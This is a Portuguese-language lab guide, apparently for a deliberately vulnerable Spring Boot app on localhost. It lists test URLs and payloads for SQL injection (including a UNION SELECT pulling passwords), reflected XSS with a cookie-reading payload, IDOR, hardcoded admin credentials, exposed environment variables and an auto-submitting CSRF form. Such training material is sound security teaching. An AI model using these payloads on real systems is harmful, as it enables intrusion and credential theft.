# 🛡️ Guia de Testes de Segurança
**Passo a passo para executar e evidenciar vulnerabilidades**

## 1. Preparação do Ambiente
### Iniciar a aplicação
```
mvn spring-boot:run
```
A aplicação subirá em:
http://localhost:8081

### Acessar Console H2
http://localhost:8081/h2

Configurações:
```
JDBC URL: jdbc:h2:mem:security
User: sa
Password:
```

## 2. Realizar Scan de rotas


## 3. Descobrir rotas ocultas com Fuzz

## 4. Identificar inconsistências de segurança com Spider e Spider AJAX

## 5. SQL Injection
### Teste 1 — OR 1=1
URL:
```
http://localhost:8081/insecure/users/find-jdbc?name=' OR '1'='1
```

### Teste 2 — UNION SELECT
```
http://localhost:8081/insecure/users/find-jdbc?name=' UNION SELECT id, username, password, email FROM users --
```

### Teste 3 — Error Based
```
http://localhost:8081/insecure/users/find-jdbc?name='
```

## 6. XSS
### Teste 4 — Reflected XSS
```
http://localhost:8081/insecure/xss?input=<script>alert(1)</script>
```

### Teste 5 — Cookie Theft
```
http://localhost:8081/insecure/xss?input=<img src=x onerror="alert(document.cookie)">
```

## 7. Exposição de Dados Sensíveis
### Teste 6 — Variáveis de Ambiente
```
http://localhost:8081/insecure/debug/env
```

## 8. IDOR
### Teste 7 — Acesso não autorizado
```
http://localhost:8081/insecure/users/1
http://localhost:8081/insecure/users/2
http://localhost:8081/insecure/users/3
```

## 9. Hardcoded Credentials
### Teste 8
```
http://localhost:8081/insecure/login?user=admin&pass=admin
```

### Teste 9
```
http://localhost:8081/insecure/login?user=admin&pass=aaaa
```

## 10. Stacktrace
### Teste 10
```
http://localhost:8081/insecure/users/find-jdbc?name='
```

## 11. Headers de Segurança
Verificar via DevTools → Network → Headers

## 12. CSRF
Criar arquivo csrf.html:
```
<form action="http://localhost:8081/insecure/login" method="POST">
  <input type="hidden" name="user" value="admin">
  <input type="hidden" name="pass" value="admin">
</form>
<script>document.forms[0].submit()</script>
```

## 13. OWASP ZAP
Active Scan:
```
http://localhost:8081/insecure/
```
